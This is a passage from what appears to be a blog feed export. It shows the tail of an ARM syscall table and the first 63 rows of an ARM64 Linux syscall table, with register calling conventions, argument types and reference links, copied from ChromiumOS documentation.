<td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_breakpoint.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_breakpoint">cs/</a></td>
<td align="center">0xf0001</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">983042</td>
<td>ARM_cacheflush</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_cacheflush.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_cacheflush">cs/</a></td>
<td align="center">0xf0002</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">983043</td>
<td>ARM_usr26</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_usr26.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_usr26">cs/</a></td>
<td align="center">0xf0003</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">983044</td>
<td>ARM_usr32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_usr32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_usr32">cs/</a></td>
<td align="center">0xf0004</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">983045</td>
<td>ARM_set_tls</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ARM_set_tls.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ARM_set_tls">cs/</a></td>
<td align="center">0xf0005</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM64 syscall table</title>
    <url>/2022/04/28/arm64-syscall-table/</url>
    <content><![CDATA[<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>Copy From: <a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md">ChromiumOS Docs - Linux System Call Table</a><br>Also View: <a href="https://cs.android.com/android/platform/superproject/+/master:bionic/libc/kernel/uapi/asm-generic/unistd.h">unistd.h - Android Code Search</a></p>
<h2 id="Calling-Conventions"><a href="#Calling-Conventions" class="headerlink" title="Calling Conventions"></a>Calling Conventions</h2><table>
<thead>
<tr>
<th align="center">arch</th>
<th align="center">syscall NR</th>
<th align="center">return</th>
<th align="center">arg0</th>
<th align="center">arg1</th>
<th align="center">arg2</th>
<th align="center">arg3</th>
<th align="center">arg4</th>
<th align="center">arg5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">arm</td>
<td align="center">r7</td>
<td align="center">r0</td>
<td align="center">r0</td>
<td align="center">r1</td>
<td align="center">r2</td>
<td align="center">r3</td>
<td align="center">r4</td>
<td align="center">r5</td>
</tr>
<tr>
<td align="center">arm64</td>
<td align="center">x8</td>
<td align="center">x0</td>
<td align="center">x0</td>
<td align="center">x1</td>
<td align="center">x2</td>
<td align="center">x3</td>
<td align="center">x4</td>
<td align="center">x5</td>
</tr>
<tr>
<td align="center">x86</td>
<td align="center">eax</td>
<td align="center">eax</td>
<td align="center">ebx</td>
<td align="center">ecx</td>
<td align="center">edx</td>
<td align="center">esi</td>
<td align="center">edi</td>
<td align="center">ebp</td>
</tr>
<tr>
<td align="center">x86_64</td>
<td align="center">rax</td>
<td align="center">rax</td>
<td align="center">rdi</td>
<td align="center">rsi</td>
<td align="center">rdx</td>
<td align="center">r10</td>
<td align="center">r8</td>
<td align="center">r9</td>
</tr>
</tbody></table>
<span id="more"></span>
<h2 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h2><table>
<thead>
<tr>
<th align="center">NR</th>
<th>syscall name</th>
<th align="center">references</th>
<th align="center">%x8</th>
<th>arg0 (%x0)</th>
<th>arg1 (%x1)</th>
<th>arg2 (%x2)</th>
<th>arg3 (%x3)</th>
<th>arg4 (%x4)</th>
<th>arg5 (%x5)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td>io_setup</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td>
<td align="center">0x00</td>
<td>unsigned nr_reqs</td>
<td>aio_context_t *ctx</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">1</td>
<td>io_destroy</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td>
<td align="center">0x01</td>
<td>aio_context_t ctx</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">2</td>
<td>io_submit</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td>
<td align="center">0x02</td>
<td>aio_context_t</td>
<td>long</td>
<td>struct iocb * *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">3</td>
<td>io_cancel</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td>
<td align="center">0x03</td>
<td>aio_context_t ctx_id</td>
<td>struct iocb *iocb</td>
<td>struct io_event *result</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">4</td>
<td>io_getevents</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td>
<td align="center">0x04</td>
<td>aio_context_t ctx_id</td>
<td>long min_nr</td>
<td>long nr</td>
<td>struct io_event *events</td>
<td>struct __kernel_timespec *timeout</td>
<td>-</td>
</tr>
<tr>
<td align="center">5</td>
<td>setxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td>
<td align="center">0x05</td>
<td>const char *path</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">6</td>
<td>lsetxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td>
<td align="center">0x06</td>
<td>const char *path</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">7</td>
<td>fsetxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td>
<td align="center">0x07</td>
<td>int fd</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">8</td>
<td>getxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td>
<td align="center">0x08</td>
<td>const char *path</td>
<td>const char *name</td>
<td>void *value</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">9</td>
<td>lgetxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td>
<td align="center">0x09</td>
<td>const char *path</td>
<td>const char *name</td>
<td>void *value</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">10</td>
<td>fgetxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td>
<td align="center">0x0a</td>
<td>int fd</td>
<td>const char *name</td>
<td>void *value</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">11</td>
<td>listxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td>
<td align="center">0x0b</td>
<td>const char *path</td>
<td>char *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">12</td>
<td>llistxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td>
<td align="center">0x0c</td>
<td>const char *path</td>
<td>char *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">13</td>
<td>flistxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td>
<td align="center">0x0d</td>
<td>int fd</td>
<td>char *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">14</td>
<td>removexattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td>
<td align="center">0x0e</td>
<td>const char *path</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">15</td>
<td>lremovexattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td>
<td align="center">0x0f</td>
<td>const char *path</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">16</td>
<td>fremovexattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td>
<td align="center">0x10</td>
<td>int fd</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">17</td>
<td>getcwd</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td>
<td align="center">0x11</td>
<td>char *buf</td>
<td>unsigned long size</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">18</td>
<td>lookup_dcookie</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td>
<td align="center">0x12</td>
<td>u64 cookie64</td>
<td>char *buf</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">19</td>
<td>eventfd2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td>
<td align="center">0x13</td>
<td>unsigned int count</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">20</td>
<td>epoll_create1</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td>
<td align="center">0x14</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">21</td>
<td>epoll_ctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td>
<td align="center">0x15</td>
<td>int epfd</td>
<td>int op</td>
<td>int fd</td>
<td>struct epoll_event *event</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">22</td>
<td>epoll_pwait</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td>
<td align="center">0x16</td>
<td>int epfd</td>
<td>struct epoll_event *events</td>
<td>int maxevents</td>
<td>int timeout</td>
<td>const sigset_t *sigmask</td>
<td>size_t sigsetsize</td>
</tr>
<tr>
<td align="center">23</td>
<td>dup</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td>
<td align="center">0x17</td>
<td>unsigned int fildes</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">24</td>
<td>dup3</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td>
<td align="center">0x18</td>
<td>unsigned int oldfd</td>
<td>unsigned int newfd</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">25</td>
<td>fcntl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td>
<td align="center">0x19</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">26</td>
<td>inotify_init1</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td>
<td align="center">0x1a</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">27</td>
<td>inotify_add_watch</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td>
<td align="center">0x1b</td>
<td>int fd</td>
<td>const char *path</td>
<td>u32 mask</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">28</td>
<td>inotify_rm_watch</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td>
<td align="center">0x1c</td>
<td>int fd</td>
<td>__s32 wd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">29</td>
<td>ioctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td>
<td align="center">0x1d</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">30</td>
<td>ioprio_set</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td>
<td align="center">0x1e</td>
<td>int which</td>
<td>int who</td>
<td>int ioprio</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">31</td>
<td>ioprio_get</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td>
<td align="center">0x1f</td>
<td>int which</td>
<td>int who</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">32</td>
<td>flock</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td>
<td align="center">0x20</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">33</td>
<td>mknodat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td>
<td align="center">0x21</td>
<td>int dfd</td>
<td>const char * filename</td>
<td>umode_t mode</td>
<td>unsigned dev</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">34</td>
<td>mkdirat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td>
<td align="center">0x22</td>
<td>int dfd</td>
<td>const char * pathname</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">35</td>
<td>unlinkat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td>
<td align="center">0x23</td>
<td>int dfd</td>
<td>const char * pathname</td>
<td>int flag</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">36</td>
<td>symlinkat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td>
<td align="center">0x24</td>
<td>const char * oldname</td>
<td>int newdfd</td>
<td>const char * newname</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">37</td>
<td>linkat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td>
<td align="center">0x25</td>
<td>int olddfd</td>
<td>const char *oldname</td>
<td>int newdfd</td>
<td>const char *newname</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">38</td>
<td>renameat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td>
<td align="center">0x26</td>
<td>int olddfd</td>
<td>const char * oldname</td>
<td>int newdfd</td>
<td>const char * newname</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">39</td>
<td>umount2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td>
<td align="center">0x27</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">40</td>
<td>mount</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td>
<td align="center">0x28</td>
<td>char *dev_name</td>
<td>char *dir_name</td>
<td>char *type</td>
<td>unsigned long flags</td>
<td>void *data</td>
<td>-</td>
</tr>
<tr>
<td align="center">41</td>
<td>pivot_root</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td>
<td align="center">0x29</td>
<td>const char *new_root</td>
<td>const char *put_old</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">42</td>
<td>nfsservctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td>
<td align="center">0x2a</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">43</td>
<td>statfs</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td>
<td align="center">0x2b</td>
<td>const char * path</td>
<td>struct statfs *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">44</td>
<td>fstatfs</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td>
<td align="center">0x2c</td>
<td>unsigned int fd</td>
<td>struct statfs *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">45</td>
<td>truncate</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td>
<td align="center">0x2d</td>
<td>const char *path</td>
<td>long length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">46</td>
<td>ftruncate</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td>
<td align="center">0x2e</td>
<td>unsigned int fd</td>
<td>unsigned long length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">47</td>
<td>fallocate</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td>
<td align="center">0x2f</td>
<td>int fd</td>
<td>int mode</td>
<td>loff_t offset</td>
<td>loff_t len</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">48</td>
<td>faccessat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td>
<td align="center">0x30</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">49</td>
<td>chdir</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td>
<td align="center">0x31</td>
<td>const char *filename</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">50</td>
<td>fchdir</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td>
<td align="center">0x32</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">51</td>
<td>chroot</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td>
<td align="center">0x33</td>
<td>const char *filename</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">52</td>
<td>fchmod</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td>
<td align="center">0x34</td>
<td>unsigned int fd</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">53</td>
<td>fchmodat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td>
<td align="center">0x35</td>
<td>int dfd</td>
<td>const char * filename</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">54</td>
<td>fchownat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td>
<td align="center">0x36</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>int flag</td>
<td>-</td>
</tr>
<tr>
<td align="center">55</td>
<td>fchown</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td>
<td align="center">0x37</td>
<td>unsigned int fd</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">56</td>
<td>openat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td>
<td align="center">0x38</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int flags</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">57</td>
<td>close</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td>
<td align="center">0x39</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">58</td>
<td>vhangup</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td>
<td align="center">0x3a</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">59</td>
<td>pipe2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td>
<td align="center">0x3b</td>
<td>int *fildes</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">60</td>
<td>quotactl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td>
<td align="center">0x3c</td>
<td>unsigned int cmd</td>
<td>const char *special</td>
<td>qid_t id</td>
<td>void *addr</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">61</td>
<td>getdents64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td>
<td align="center">0x3d</td>
<td>unsigned int fd</td>
<td>struct linux_dirent64 *dirent</td>
<td>unsigned int count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">62</td>
<td>lseek</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td>
<td align="center">0x3e</td>
<td>unsigned int fd</td>
<td>off_t offset</td>
<td>unsigned int whence</td>
<td>-</td>
<td>-</td>
<td>-</td>
